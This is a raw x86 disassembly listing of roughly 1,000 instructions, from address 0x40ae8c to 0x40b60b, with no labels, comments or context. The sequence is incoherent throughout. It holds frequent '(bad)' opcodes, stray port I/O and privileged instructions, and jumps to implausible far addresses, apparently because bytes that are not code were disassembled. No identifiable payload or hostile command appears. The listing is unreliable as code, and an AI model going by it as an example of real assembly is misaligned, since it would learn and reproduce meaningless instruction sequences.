  40ae8c:	cmp    DWORD PTR [esi+edi*1-0x60],eax
  40ae90:	pop    cx
  40ae92:	lods   al,BYTE PTR ds:[esi]
  40ae93:	push   ds
  40ae94:	jp     0x40ae5a
  40ae96:	jnp    0x40aea4
  40ae98:	mov    ah,0xc3
  40ae9a:	pop    es
  40ae9b:	lods   al,BYTE PTR ds:[esi]
  40ae9c:	loop   0x40aec9
  40ae9e:	lea    eax,[eax-0x1d30d602]
  40aea4:	fisttp WORD PTR [edi-0x69]
  40aea7:	retf   
  40aea8:	pop    edi
  40aea9:	xchg   esp,eax
  40aeaa:	xlat   BYTE PTR ds:[ebx]
  40aeab:	xchg   bh,ch
  40aead:	inc    edi
  40aeae:	out    0x53,eax
  40aeb0:	bound  esi,QWORD PTR [ecx-0x24]
  40aeb3:	add    al,0x9d
  40aeb5:	sub    DWORD PTR [ecx+0x70e356bb],edi
  40aebb:	fstp   DWORD PTR [esi+0x79]
  40aebe:	in     eax,dx
  40aebf:	jns    0x40af1d
  40aec1:	push   ecx
  40aec2:	jbe    0x40aeca
  40aec4:	aam    0x12
  40aec6:	sbb    dl,BYTE PTR [ebp+eiz*2-0x1221b0f9]
  40aecd:	mov    cl,0xa
  40aecf:	mov    cl,BYTE PTR [edx+edi*2+0x66cbcd0a]
  40aed6:	retf   0x3c3e
  40aed9:	stos   DWORD PTR es:[edi],eax
  40aeda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aedb:	adc    al,BYTE PTR [edx+0x1c]
  40aede:	addr16 push esi
  40aee0:	jecxz  0x40ae97
  40aee2:	jnp    0x40aeb0
  40aee4:	xchg   esp,eax
  40aee5:	rol    DWORD PTR [edx],cl
  40aee7:	or     eax,0xd96d8142
  40aeec:	pushf  
  40aeed:	sbb    al,0xae
  40aeef:	xchg   ecx,eax
  40aef0:	pop    ecx
  40aef1:	mov    ecx,0xd37d8318
  40aef6:	and    edi,ecx
  40aef8:	xor    esp,DWORD PTR [edx]
  40aefa:	xchg   esi,eax
  40aefb:	out    dx,al
  40aefc:	mov    ebx,0x982d6ca8
  40af01:	jb     0x40ae8c
  40af03:	loopne 0x40af1b
  40af05:	pop    esp
  40af06:	ins    BYTE PTR es:[edi],dx
  40af07:	jbe    0x40af56
  40af09:	jo     0x40af71
  40af0b:	add    eax,0x37566f34
  40af10:	(bad)  
  40af11:	rol    DWORD PTR [ecx+0x57],1
  40af14:	pushf  
  40af15:	push   eax
  40af16:	inc    ebx
  40af17:	jmp    0x40aee7
  40af19:	mov    ?,WORD PTR ds:0x76d5091b
  40af1f:	xor    DWORD PTR [edx-0x72],0xf561589e
  40af26:	rcl    BYTE PTR [edx+0x6349cca7],0x5b
  40af2d:	fld    DWORD PTR [ebx+0x195d6a60]
  40af33:	add    BYTE PTR [esi+0x558fc5f0],bh
  40af39:	inc    ebp
  40af3a:	je     0x40aec9
  40af3c:	xchg   edi,eax
  40af3d:	add    ah,0x25
  40af40:	jmp    0x32244adc
  40af45:	out    0xcd,eax
  40af47:	sbb    BYTE PTR [eax+ecx*2+0x557b51d6],bl
  40af4e:	outs   dx,BYTE PTR ds:[esi]
  40af4f:	dec    ebx
  40af50:	in     eax,dx
  40af51:	ror    BYTE PTR [esi+edi*8-0x7c],cl
  40af55:	push   esp
  40af56:	push   edi
  40af57:	clc    
  40af58:	popa   
  40af59:	adc    BYTE PTR [esi],dl
  40af5b:	dec    ebp
  40af5c:	mov    edi,0x93dfdf13
  40af61:	xor    edi,DWORD PTR [edi]
  40af63:	cmp    bl,BYTE PTR [esi+ebx*2+0x22ce5935]
  40af6a:	mov    edi,0x51a335c2
  40af6f:	mov    esi,0x65bffbe3
  40af74:	dec    esp
  40af75:	stos   DWORD PTR es:[edi],eax
  40af76:	mov    esi,0xd032d226
  40af7b:	psubq  mm6,QWORD PTR [ebx-0x3c]
  40af7f:	jmp    eax
  40af81:	dec    edi
  40af82:	leave  
  40af83:	adc    esi,esi
  40af85:	in     eax,0x43
  40af87:	addr16 pop edx
  40af89:	and    eax,0x64040cba
  40af8e:	repnz lds ebp,FWORD PTR fs:[ecx-0x77]
  40af93:	xor    edi,eax
  40af95:	dec    edi
  40af96:	inc    esi
  40af97:	loop   0x40af5c
  40af99:	and    BYTE PTR [esi],bh
  40af9b:	arpl   WORD PTR [ecx],dx
  40af9d:	mov    ds:0x8b6f6bda,al
  40afa2:	add    BYTE PTR [ebx+0x56b76f32],0x72
  40afa9:	mov    cl,0x29
  40afab:	adc    BYTE PTR [edx],al
  40afad:	leave  
  40afae:	daa    
  40afaf:	adc    eax,0xeced582d
  40afb4:	mov    cl,0x88
  40afb6:	mov    ah,BYTE PTR [ecx]
  40afb8:	xor    ebp,DWORD PTR [edi]
  40afba:	aas    
  40afbb:	rcr    DWORD PTR [ecx-0x5f],cl
  40afbe:	repz cmp edi,DWORD PTR ds:0xce5974dc
  40afc5:	cmp    ecx,DWORD PTR [esi-0x12]
  40afc8:	imul   bh
  40afca:	hlt    
  40afcb:	loopne 0x40afa0
  40afcd:	test   BYTE PTR [ecx],al
  40afcf:	mov    ah,0xe
  40afd1:	jl     0x40af86
  40afd3:	neg    BYTE PTR [edx+0x1d]
  40afd6:	in     al,0x5e
  40afd8:	arpl   WORD PTR [ebp-0xe],bp
  40afdb:	dec    eax
  40afdc:	sbb    BYTE PTR [eax-0x94b4b48],dh
  40afe2:	scas   al,BYTE PTR es:[edi]
  40afe3:	xchg   ebp,eax
  40afe4:	out    dx,al
  40afe5:	pop    ecx
  40afe6:	add    DWORD PTR ds:0xa0778d1e,esp
  40afec:	sub    ebx,edi
  40afee:	sbb    eax,0xd6a2790a
  40aff3:	sbb    BYTE PTR [edx],al
  40aff5:	out    0xb6,al
  40aff7:	push   ebx
  40aff8:	mov    ds:0x75b323f5,al
  40affd:	jmp    0x91345be2
  40b002:	sbb    esi,DWORD PTR [ecx-0x11]
  40b005:	and    BYTE PTR [eax+ebp*2+0x601c9eb],al
  40b00c:	jae    0x40b00b
  40b00e:	inc    edi
  40b00f:	mov    dl,0xec
  40b011:	push   ebp
  40b012:	ret    
  40b013:	jp     0x40b02e
  40b015:	cmp    ebp,DWORD PTR [ebp-0x18]
  40b018:	je     0x40affe
  40b01a:	aas    
  40b01b:	ins    BYTE PTR es:[edi],dx
  40b01c:	pushf  
  40b01d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b01e:	mov    al,ds:0xf74b7ba6
  40b023:	push   ebp
  40b024:	mov    ebp,0x7176c024
  40b029:	xor    DWORD PTR [eax+0x6a],esp
  40b02c:	pusha  
  40b02d:	lods   al,BYTE PTR ds:[esi]
  40b02e:	(bad)  
  40b02f:	(bad)
  40b032:	mov    ebx,0x61ffd92f
  40b037:	std    
  40b038:	xor    edx,ecx
  40b03a:	vpcmpgtd xmm2,xmm0,XMMWORD PTR [ebp+0x4]
  40b03f:	pop    ebp
  40b040:	(bad)  
  40b041:	jo     0x40b080
  40b043:	adc    BYTE PTR [eax+0x3b],bh
  40b046:	xchg   ebx,eax
  40b047:	push   ds
  40b048:	fistp  WORD PTR [edx+0xf]
  40b04b:	pop    fs
  40b04d:	cmp    DWORD PTR [edi],esp
  40b04f:	cmp    bh,ah
  40b051:	icebp  
  40b052:	mov    bh,0x70
  40b054:	mov    WORD PTR [bx+0xaff],cs
  40b059:	inc    esp
  40b05a:	jmp    0x1925f30a
  40b05f:	xor    edx,ecx
  40b061:	(bad)  
  40b062:	outs   dx,DWORD PTR ds:[esi]
  40b063:	sbb    DWORD PTR [esi+0x605f4323],ebp
  40b069:	out    0x69,eax
  40b06b:	mov    edx,0xdbfecfb
  40b070:	and    eax,0x24619f41
  40b075:	iret   
  40b076:	hlt    
  40b077:	shl    DWORD PTR [ebx+0x29ab63f3],cl
  40b07d:	adc    al,bl
  40b07f:	mov    bh,BYTE PTR [esp+ebx*4+0x14b583d9]
  40b086:	call   0xfe0b9e9c
  40b08b:	lds    esi,FWORD PTR [ebx+0x2423942c]
  40b091:	repnz fwait
  40b093:	sbb    al,0x90
  40b095:	inc    esp
  40b096:	pop    es
  40b097:	cmp    eax,0x2636996f
  40b09c:	enter  0xa22d,0xef
  40b0a0:	cmp    eax,0x35edcbf6
  40b0a5:	jns    0x40b126
  40b0a7:	mov    eax,ds:0xcff8f386
  40b0ac:	lock imul esi,DWORD PTR [eax+0x31b09d41],0x1b97d6ff
  40b0b7:	adc    bl,0x8b
  40b0ba:	mov    edx,0xf3b48bff
  40b0bf:	ds out 0x3b,al
  40b0c2:	add    ch,ah
  40b0c4:	rcl    BYTE PTR [edi],0xd1
  40b0c7:	mov    ebp,0x62e3d7b6
  40b0cc:	(bad)  
  40b0cd:	rol    DWORD PTR [ebp-0x10eac2c],1
  40b0d3:	int3   
  40b0d4:	sar    esi,cl
  40b0d6:	repz jecxz 0x40b154
  40b0d9:	dec    edx
  40b0da:	and    DWORD PTR [ebx+0x4cf05bf],ebx
  40b0e0:	scas   eax,DWORD PTR es:[edi]
  40b0e1:	mov    ebx,0x82a867f
  40b0e6:	dec    esp
  40b0e7:	jmp    0x47e536b0
  40b0ec:	daa    
  40b0ed:	dec    ebx
  40b0ee:	mov    eax,ds:0xd0eab118
  40b0f3:	hlt    
  40b0f4:	xor    ebp,eax
  40b0f6:	mov    ebx,0xf2a0263
  40b0fb:	and    al,0x6c
  40b0fd:	adc    BYTE PTR [ebp+edi*2-0x68f4147f],bh
  40b104:	sti    
  40b105:	(bad)  
  40b106:	fdivr  st,st(2)
  40b108:	or     DWORD PTR [edx+0x27],eax
  40b10b:	push   ds
  40b10c:	and    ebp,esi
  40b10e:	sbb    bh,BYTE PTR [edi+0x2838e5d6]
  40b114:	jle    0x40b0e4
  40b116:	scas   al,BYTE PTR es:[edi]
  40b117:	jnp    0x40b0db
  40b119:	mov    ds:0xa59c0a62,eax
  40b11e:	jmp    0x40b0f4
  40b120:	mov    al,cl
  40b122:	push   0xd9ffd090
  40b127:	jo     0x40b147
  40b129:	in     eax,0xad
  40b12b:	mov    BYTE PTR [edx+0x3c3a5aa9],cl
  40b131:	stos   BYTE PTR es:[edi],al
  40b132:	shr    BYTE PTR [ebp-0x36],1
  40b135:	or     esi,DWORD PTR [edx]
  40b137:	rcr    BYTE PTR [ebp-0x5f8f2929],cl
  40b13d:	mov    cl,0xfa
  40b13f:	mov    eax,0x1fe5e4e6
  40b144:	push   ss
  40b145:	add    ah,0xc1
  40b148:	pop    ss
  40b149:	inc    edi
  40b14a:	ficom  DWORD PTR [eax]
  40b14c:	add    ecx,DWORD PTR [edx-0x58]
  40b14f:	sti    
  40b150:	mov    eax,ds:0x8481e7e1
  40b155:	and    ch,BYTE PTR [ebp+0x7a05874]
  40b15b:	popf   
  40b15c:	xor    DWORD PTR [ecx],ebx
  40b15e:	(bad)
  40b161:	cld    
  40b162:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b163:	jne    0x40b144
  40b165:	je     0x40b166
  40b167:	add    ebp,edx
  40b169:	pop    esp
  40b16a:	call   0x45a9a53e
  40b16f:	push   esi
  40b170:	imul   ebp,DWORD PTR [ebx+0x308169a0],0x46d5b152
  40b17a:	xchg   ebp,eax
  40b17b:	adc    eax,0x140965b
  40b180:	outs   dx,BYTE PTR ds:[esi]
  40b181:	in     eax,dx
  40b182:	adc    eax,0xb39cb695
  40b187:	(bad)  
  40b188:	in     al,dx
  40b189:	int    0x6d
  40b18b:	int    0x1d
  40b18d:	mov    bh,cl
  40b18f:	mov    esp,0x53bcd086
  40b194:	lahf   
  40b195:	adc    eax,0x3d92bc55
  40b19a:	das    
  40b19b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b19c:	retf   
  40b19d:	daa    
  40b19e:	push   ss
  40b19f:	xlat   BYTE PTR ds:[ebx]
  40b1a0:	add    bh,BYTE PTR [eax+0x11]
  40b1a3:	js     0x40b152
  40b1a5:	popa   
  40b1a6:	ja     0x40b202
  40b1a8:	adc    eax,0x671bd20a
  40b1ad:	xchg   edi,eax
  40b1ae:	pop    edi
  40b1af:	xor    DWORD PTR [edx-0x489be12],ecx
  40b1b5:	push   ss
  40b1b6:	sub    al,0x54
  40b1b8:	sahf   
  40b1b9:	loope  0x40b1fc
  40b1bb:	add    dh,BYTE PTR [esi+eax*8]
  40b1be:	(bad)  
  40b1bf:	loope  0x40b18a
  40b1c1:	js     0x40b181
  40b1c3:	pop    ebx
  40b1c4:	sar    DWORD PTR [esi],1
  40b1c6:	mov    ebp,0x796a0af4
  40b1cb:	loope  0x40b191
  40b1cd:	call   0xf88f3a4
  40b1d2:	xlat   BYTE PTR ss:[ebx]
  40b1d4:	hlt    
  40b1d5:	xor    ch,ah
  40b1d7:	xchg   esi,eax
  40b1d8:	mov    dh,0xf3
  40b1da:	dec    esp
  40b1db:	nop
  40b1dc:	xchg   DWORD PTR [ebx],esp
  40b1de:	popf   
  40b1df:	and    eax,0x66a75884
  40b1e4:	leave  
  40b1e5:	adc    DWORD PTR [ebp-0x5e],edi
  40b1e8:	shr    BYTE PTR [ebp+0x2cacb30d],1
  40b1ee:	test   eax,0xafa814b5
  40b1f3:	int    0x1d
  40b1f5:	inc    edi
  40b1f6:	ret    0x6a92
  40b1f9:	mov    WORD PTR [eax+0x212e0d4b],gs
  40b1ff:	cli    
  40b200:	xchg   BYTE PTR [eax+ecx*4],bl
  40b203:	dec    ebx
  40b204:	aaa    
  40b205:	arpl   bx,si
  40b207:	cwde   
  40b208:	sub    eax,0x542598b0
  40b20d:	pop    edi
  40b20e:	or     BYTE PTR [eax+0x35],ch
  40b211:	mov    esi,0x4e198023
  40b216:	inc    esp
  40b217:	mov    dh,0xa2
  40b219:	mov    esi,0x2e961acd
  40b21e:	dec    esp
  40b21f:	jmp    0xbaf26010
  40b224:	xor    dh,cl
  40b226:	inc    ebx
  40b227:	retf   0x7b30
  40b22a:	test   eax,0x47e2eff9
  40b22f:	aam    0x64
  40b231:	inc    esp
  40b232:	push   0xffffff9c
  40b234:	fdiv   QWORD PTR [eax-0x64]
  40b237:	xchg   ecx,eax
  40b239:	into   
  40b23a:	adc    BYTE PTR [esp+esi*1-0x43],al
  40b23e:	popf   
  40b23f:	xchg   edx,eax
  40b240:	xchg   DWORD PTR [eax],ebx
  40b242:	and    bh,dh
  40b244:	(bad)  
  40b245:	lods   al,BYTE PTR ds:[esi]
  40b246:	or     ah,ch
  40b248:	mov    bh,0x55
  40b24a:	loopne 0x40b263
  40b24c:	mov    edx,DWORD PTR [edx-0x6d202175]
  40b252:	out    dx,al
  40b253:	pushf  
  40b254:	cmp    eax,0xfe213618
  40b259:	es sahf 
  40b25b:	mov    edi,0xb90ce64d
  40b260:	jne    0x40b2e0
  40b262:	cli    
  40b263:	shr    DWORD PTR [esi-0x2a],1
  40b266:	ror    BYTE PTR [edx-0x4b36ee0f],cl
  40b26c:	xchg   DWORD PTR [ecx-0x53],edx
  40b26f:	inc    edi
  40b270:	mov    cl,BYTE PTR [eax]
  40b272:	mov    edx,0x7e7c57fd
  40b277:	dec    ecx
  40b278:	or     DWORD PTR [ebp+0x56],eax
  40b27b:	out    dx,al
  40b27c:	jne    0x40b2a8
  40b27e:	push   edx
  40b27f:	int    0x97
  40b281:	popa   
  40b282:	rol    DWORD PTR [ebp-0x1c],1
  40b285:	popa   
  40b286:	xor    BYTE PTR [eax-0x4a],0x7a
  40b28a:	and    ecx,DWORD PTR [edx+0x48fd6b7a]
  40b290:	jg     0x40b311
  40b292:	int    0xe8
  40b294:	dec    edx
  40b295:	cmp    ebp,DWORD PTR [ebx+0x35]
  40b298:	js     0x40b2c8
  40b29a:	loope  0x40b2fd
  40b29c:	cmp    ebp,ebp
  40b29e:	or     eax,0x1c757c8a
  40b2a3:	push   ds
  40b2a4:	jecxz  0x40b309
  40b2a6:	or     esp,DWORD PTR [ecx]
  40b2a8:	in     eax,0xb8
  40b2aa:	pushf  
  40b2ab:	push   eax
  40b2ac:	stc    
  40b2ad:	fsub   QWORD PTR [ecx]
  40b2af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2b0:	xor    esp,DWORD PTR [edi]
  40b2b2:	jg     0x40b285
  40b2b4:	sbb    al,0x4e
  40b2b6:	aas    
  40b2b7:	ja     0x40b269
  40b2b9:	add    DWORD PTR [edi],edx
  40b2bb:	popa   
  40b2bc:	(bad)  
  40b2bd:	mov    dl,BYTE PTR [ecx+ecx*2-0x4b0e523a]
  40b2c4:	fiadd  DWORD PTR [ebx-0x55]
  40b2c7:	dec    ebp
  40b2c8:	xchg   BYTE PTR [edi+0x4bb90e2f],al
  40b2ce:	mov    DWORD PTR [edx],eax
  40b2d0:	addr16 js 0x40b27d
  40b2d3:	out    dx,al
  40b2d4:	mov    edi,0x78fa8e1
  40b2d9:	imul   esi,eax,0xffffffc2
  40b2dc:	std    
  40b2dd:	xor    edx,DWORD PTR [edx+0x2f]
  40b2e0:	xchg   esp,eax
  40b2e1:	lods   al,BYTE PTR ds:[esi]
  40b2e2:	xchg   edi,eax
  40b2e3:	dec    edx
  40b2e4:	xchg   ecx,eax
  40b2e5:	ret    0xe4bb
  40b2e8:	(bad)  [eax+0x61]
  40b2eb:	pop    ds
  40b2ec:	mov    eax,ds:0x5454742d
  40b2f1:	fisubr DWORD PTR [eax+edi*8]
  40b2f4:	sti    
  40b2f5:	test   al,0x2a
  40b2f7:	jg     0x40b32f
  40b2f9:	dec    esi
  40b2fa:	in     al,dx
  40b2fb:	push   edi
  40b2fc:	dec    ebp
  40b2fd:	test   al,0xef
  40b2ff:	sub    esp,DWORD PTR [ebp+0x29415de4]
  40b305:	inc    edi
  40b306:	call   0xd0f77d00
  40b30b:	mov    esp,0xe1c03474
  40b310:	data16 sbb ch,0xad
  40b314:	in     eax,0xab
  40b316:	mov    ah,dl
  40b318:	sbb    ebp,ebp
  40b31a:	call   0xb486:0xb111474d
  40b321:	inc    esp
  40b322:	mov    ds:0x97ce10ce,al
  40b327:	mov    ecx,0x3af4208c
  40b32c:	scas   eax,DWORD PTR es:[edi]
  40b32d:	jmp    0x40b347
  40b32f:	or     al,0xaa
  40b331:	lods   eax,DWORD PTR ds:[esi]
  40b332:	aad    0x25
  40b334:	scas   eax,DWORD PTR es:[edi]
  40b335:	in     al,0x77
  40b337:	out    0x3e,al
  40b339:	mov    DWORD PTR [eax*8+0x6d756111],edi
  40b340:	sti    
  40b341:	js     0x40b381
  40b343:	add    ebp,0x18
  40b346:	sub    al,dh
  40b348:	cli    
  40b349:	dec    ebp
  40b34a:	adc    BYTE PTR [esi-0x9],0x3c
  40b34e:	jae    0x40b326
  40b350:	(bad)  
  40b351:	fcom   QWORD PTR [ebp+0x528f764c]
  40b357:	mov    ?,ebp
  40b359:	mov    cs,WORD PTR [ebx-0x6e]
  40b35c:	aas    
  40b35d:	aad    0x33
  40b35f:	pop    ebx
  40b360:	popa   
  40b361:	dec    ebx
  40b362:	pop    ds
  40b363:	fiadd  DWORD PTR ds:0xbf61eb2e
  40b369:	cmp    esi,DWORD PTR [ecx-0x7013b374]
  40b36f:	(bad)  [ebx+0x4fb345ad]
  40b375:	jge    0x40b31f
  40b377:	add    al,0x69
  40b379:	sbb    eax,0xed6c4463
  40b37e:	sahf   
  40b37f:	xchg   ch,dl
  40b381:	jnp    0x40b3d5
  40b383:	leave  
  40b384:	cmp    edx,ecx
  40b386:	xor    al,0xca
  40b388:	inc    edi
  40b389:	xchg   ebp,eax
  40b38a:	push   eax
  40b38b:	mov    ds:0x13618223,al
  40b390:	xchg   esp,eax
  40b391:	and    bh,bl
  40b393:	ret    0xd6ba
  40b396:	aaa    
  40b397:	ret    
  40b398:	dec    ebx
  40b399:	or     BYTE PTR [edx+0x7aaeab4b],dh
  40b39f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3a0:	arpl   sp,sp
  40b3a2:	enter  0x37e1,0xd1
  40b3a6:	adc    ah,BYTE PTR [edi-0x31]
  40b3a9:	cwde   
  40b3aa:	add    edi,esi
  40b3ac:	(bad)
  40b3af:	gs jmp 0x17ad:0xbd468e69
  40b3b7:	jp     0x40b3ba
  40b3b9:	lods   al,BYTE PTR ds:[esi]
  40b3ba:	cdq    
  40b3bb:	or     DWORD PTR ds:0x57b54a81,esi
  40b3c1:	mov    cl,0xbd
  40b3c3:	arpl   WORD PTR [esi+edx*4],cx
  40b3c6:	(bad)  
  40b3c8:	fisttp WORD PTR [ecx]
  40b3ca:	jp     0x40b39f
  40b3cc:	add    BYTE PTR [ebp+ebp*1+0x33],dl
  40b3d0:	xchg   ecx,eax
  40b3d1:	in     eax,dx
  40b3d2:	push   ss
  40b3d3:	popa   
  40b3d4:	bound  edx,QWORD PTR [ebp+edx*1+0xc]
  40b3d8:	pop    edx
  40b3d9:	mov    ch,0xca
  40b3db:	(bad)  
  40b3dc:	sbb    esi,DWORD PTR [ebx]
  40b3de:	mov    bh,0x86
  40b3e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3e1:	xor    al,0x8c
  40b3e3:	inc    eax
  40b3e4:	test   al,0xe2
  40b3e6:	push   esi
  40b3e7:	pop    esp
  40b3e8:	mov    al,0xb
  40b3ea:	dec    ebp
  40b3eb:	push   ebp
  40b3ec:	out    0x28,al
  40b3ee:	jecxz  0x40b467
  40b3f0:	cs inc ecx
  40b3f2:	push   ecx
  40b3f3:	add    BYTE PTR [esi-0x7fcba015],bl
  40b3f9:	stos   DWORD PTR es:[edi],eax
  40b3fa:	cmp    DWORD PTR [edx+0x2a],ebx
  40b3fd:	nop
  40b3fe:	daa    
  40b3ff:	pushf  
  40b400:	and    ecx,edi
  40b402:	xchg   ebx,eax
  40b403:	push   edi
  40b404:	icebp  
  40b405:	dec    eax
  40b406:	jg     0x40b44b
  40b408:	inc    ebx
  40b409:	pop    ss
  40b40a:	inc    esi
  40b40b:	into   
  40b40c:	add    edi,esp
  40b40e:	adc    eax,0xe455dce8
  40b413:	mov    dh,0xab
  40b415:	mov    ah,BYTE PTR [esi+0x1a]
  40b418:	cmp    DWORD PTR [edi],ebp
  40b41a:	jmp    DWORD PTR [edx]
  40b41c:	push   ebx
  40b41d:	adc    DWORD PTR [eax-0x6],0xffffffff
  40b421:	pop    ds
  40b422:	outs   dx,DWORD PTR ds:[esi]
  40b423:	push   0x66
  40b425:	fnstenv [ebp+0x482cc5c8]
  40b42b:	push   ecx
  40b42c:	inc    eax
  40b42d:	cmp    bh,0x1
  40b430:	adc    edx,DWORD PTR [ebx+0x42e9c47]
  40b436:	mov    edx,edx
  40b438:	sahf   
  40b439:	leave  
  40b43a:	pusha  
  40b43b:	cwde   
  40b43c:	daa    
  40b43d:	inc    eax
  40b43e:	jno    0x40b3fd
  40b440:	mov    bh,0x37
  40b442:	in     al,0xe2
  40b444:	cld    
  40b445:	dec    edi
  40b446:	dec    edi
  40b447:	stc    
  40b448:	mov    cl,0x79
  40b44a:	xor    al,0x60
  40b44c:	mov    ch,0xf9
  40b44e:	sbb    ecx,DWORD PTR [ecx+0x7bc8a280]
  40b454:	not    ch
  40b456:	ja     0x40b41a
  40b458:	mov    ecx,0xed1e9b8b
  40b45d:	lds    eax,FWORD PTR [esp+ecx*1]
  40b460:	ins    BYTE PTR es:[edi],dx
  40b461:	shl    eax,0x1a
  40b464:	ja     0x40b49f
  40b466:	mov    dl,0x3f
  40b468:	xchg   ecx,eax
  40b469:	jmp    0xdcfd:0x6cc2a4af
  40b470:	jle    0x40b40a
  40b472:	adc    al,0xaa
  40b474:	pop    es
  40b475:	cmp    DWORD PTR [ebx+0x61],ebp
  40b478:	inc    esi
  40b479:	cs sub eax,0x99f6e7d7
  40b47f:	push   ss
  40b480:	data16 cli 
  40b482:	fst    st(5)
  40b484:	loop   0x40b4ce
  40b486:	add    DWORD PTR [ebp-0x5cf8ab15],0x17
  40b48d:	pushf  
  40b48e:	cmp    BYTE PTR [edx+0x19],al
  40b491:	ret    0x8f19
  40b494:	cmp    ebx,DWORD PTR [edx-0x5e08efb9]
  40b49a:	(bad)  
  40b49b:	push   0x39a69c74
  40b4a0:	push   esp
  40b4a1:	xor    eax,0xa36e77f6
  40b4a6:	xor    BYTE PTR [edx],ah
  40b4a8:	mov    DWORD PTR [ebx-0x71d1726],esp
  40b4ae:	adc    al,0x77
  40b4b0:	fiadd  WORD PTR [eax-0x73]
  40b4b3:	idiv   DWORD PTR [edx+0x1e964d4b]
  40b4b9:	stc    
  40b4ba:	xor    edi,ebp
  40b4bc:	cwde   
  40b4bd:	jl     0x40b52a
  40b4bf:	les    ecx,FWORD PTR [eax-0x46]
  40b4c2:	add    DWORD PTR [ebx],0x687ad28b
  40b4c8:	xchg   edi,eax
  40b4c9:	out    dx,eax
  40b4ca:	test   DWORD PTR [esi],edx
  40b4cc:	test   dh,ah
  40b4ce:	js     0x40b505
  40b4d0:	test   eax,0xf49cc389
  40b4d5:	(bad)  
  40b4d6:	xor    eax,0xb2e5ce1a
  40b4db:	sbb    al,0x9b
  40b4dd:	sbb    edi,DWORD PTR [edi-0x10]
  40b4e0:	add    dh,al
  40b4e2:	cmp    al,0x28
  40b4e4:	push   esi
  40b4e5:	xchg   ebx,eax
  40b4e6:	nop
  40b4e7:	iret   
  40b4e8:	dec    edi
  40b4e9:	mov    bl,0x33
  40b4eb:	mov    eax,ds:0xf86621e7
  40b4f0:	ficom  DWORD PTR [eax+0x19c47a54]
  40b4f6:	jno    0x40b4a3
  40b4f8:	rol    ecx,cl
  40b4fa:	test   al,0xc6
  40b4fc:	mov    ch,0x4e
  40b4fe:	mov    cl,dl
  40b500:	aaa    
  40b501:	jno    0x40b56b
  40b503:	aas    
  40b504:	push   es
  40b505:	jmp    0x1cec835e
  40b50a:	sbb    al,0xa1
  40b50c:	sbb    DWORD PTR [edx-0x6e],ebp
  40b50f:	icebp  
  40b510:	popa   
  40b511:	or     al,0x3f
  40b513:	and    bh,BYTE PTR [ebx]
  40b515:	scas   al,BYTE PTR es:[edi]
  40b516:	rol    DWORD PTR [ebx],cl
  40b518:	test   eax,0x423f84e1
  40b51d:	sub    al,0x27
  40b51f:	xchg   esp,eax
  40b520:	pop    edi
  40b521:	cmp    al,0x3c
  40b523:	xchg   esi,eax
  40b524:	or     BYTE PTR [edx],bl
  40b526:	mov    esp,0x232dfee3
  40b52b:	push   0x3
  40b52d:	and    dl,bl
  40b52f:	sahf   
  40b530:	mov    edx,DWORD PTR ds:0x7582bc7e
  40b536:	cdq    
  40b537:	push   ecx
  40b538:	cmp    edx,DWORD PTR [ecx+0x29]
  40b53b:	jmp    FWORD PTR [esi]
  40b53d:	call   0xbf17:0x1ea0faa3
  40b544:	sbb    bl,cl
  40b546:	dec    esi
  40b547:	cld    
  40b548:	dec    edi
  40b549:	mov    WORD PTR [edx],fs
  40b54b:	cli    
  40b54c:	rol    dl,cl
  40b54e:	mov    ebp,0xfc7ddf22
  40b553:	adc    eax,0xc6381c8e
  40b558:	or     DWORD PTR [esi-0x3a],ebp
  40b55b:	mov    ds:0xc25bbd50,eax
  40b560:	ror    BYTE PTR [ecx-0x6a],0x89
  40b564:	ret    
  40b565:	jnp    0x40b516
  40b567:	aaa    
  40b568:	sub    BYTE PTR [eax+ecx*1-0x51da08da],dh
  40b56f:	lahf   
  40b570:	inc    ebx
  40b571:	mov    esp,0xa5de6169
  40b576:	mov    BYTE PTR ds:0x47d26ba2,ah
  40b57c:	mov    eax,ds:0xb6ba298a
  40b581:	leave  
  40b582:	std    
  40b583:	and    ebx,eax
  40b585:	xor    BYTE PTR [edi-0x6a],0x6c
  40b589:	xchg   ebx,eax
  40b58a:	mov    edi,0x154c101d
  40b58f:	das    
  40b590:	pop    edx
  40b591:	push   cs
  40b592:	push   ebp
  40b593:	pop    ds
  40b594:	mov    bl,0x8e
  40b596:	cmp    BYTE PTR [edi-0x10734b2d],al
  40b59c:	adc    eax,0x592e3ce2
  40b5a1:	pop    ebx
  40b5a2:	and    bh,dh
  40b5a4:	fsubrp st(5),st
  40b5a6:	xor    bl,bl
  40b5a8:	pop    ds
  40b5a9:	push   eax
  40b5aa:	inc    DWORD PTR [edx+eax*1-0x37]
  40b5ae:	gs pop esp
  40b5b0:	and    eax,0xd4ef93b8
  40b5b5:	xlat   BYTE PTR ds:[ebx]
  40b5b6:	push   ss
  40b5b7:	nop
  40b5b8:	cmp    ecx,edi
  40b5ba:	lock dec ebx
  40b5bc:	add    DWORD PTR [esi-0x57],0x20
  40b5c0:	inc    edi
  40b5c1:	es inc eax
  40b5c3:	addr16 push edi
  40b5c5:	dec    ebp
  40b5c6:	dec    ecx
  40b5c7:	lods   eax,DWORD PTR ds:[esi]
  40b5c8:	add    ah,0x85
  40b5cb:	adc    DWORD PTR [edx+ecx*1],eax
  40b5ce:	push   0x3
  40b5d0:	ss inc al
  40b5d3:	dec    edi
  40b5d4:	and    al,0x0
  40b5d6:	dec    edx
  40b5d7:	dec    edi
  40b5d8:	test   DWORD PTR [esi-0x30],eax
  40b5db:	jecxz  0x40b649
  40b5dd:	retf   
  40b5de:	retf   
  40b5df:	(bad)  
  40b5e0:	popa   
  40b5e1:	xchg   esp,eax
  40b5e2:	add    eax,0x4513e321
  40b5e7:	cmp    al,0x3b
  40b5e9:	xchg   esp,eax
  40b5ea:	xchg   ecx,eax
  40b5eb:	mov    edx,ecx
  40b5ed:	push   ebx
  40b5ee:	and    ecx,DWORD PTR [ebp+eiz*8+0x4498b003]
  40b5f5:	and    BYTE PTR [ebx+eax*1],al
  40b5f8:	cld    
  40b5f9:	or     eax,0xd14e9666
  40b5fe:	in     eax,0x1
  40b600:	mov    dh,0xa3
  40b602:	adc    bh,BYTE PTR [edx+0x38943452]
  40b608:	pop    ss
  40b609:	xor    al,0x28
  40b60b:	push   cs
